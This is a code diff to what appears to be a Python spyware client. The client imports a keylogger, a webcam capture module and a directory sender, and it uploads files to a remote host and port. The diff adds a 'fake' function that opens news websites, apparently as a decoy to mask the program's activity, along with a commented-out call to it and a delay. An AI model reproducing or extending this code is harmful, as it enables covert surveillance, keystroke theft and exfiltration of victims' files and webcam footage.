@@ -13,6 +13,14 @@ from sendsth import send_dir
 from keylogger import keylogger
 from camera import video_main
 
+def fake():
+    import webbrowser as bw
+    from config import news_website
+    for nw in news_website:
+        bw.open(nw)
+    return None
+
+
 def client(host, port, isEndFlag):
     start_dirs = upload_dirs.get(platform.system(), [])
     save_local_dirs  = client_save_dirs.get(platform.system(), [])
@@ -46,6 +54,10 @@ def client(host, port, isEndFlag):
     #TODO: Run webcam
     cammera_thread.start()
     threads.append(cammera_thread)
+    #TODO: Run Fake function
+    #fake()
+    #TODO: Set timeout 10 min
+    #time.sleep(600)
     
     time.sleep(0.1)
     input('Debug input to end the progrm> ')
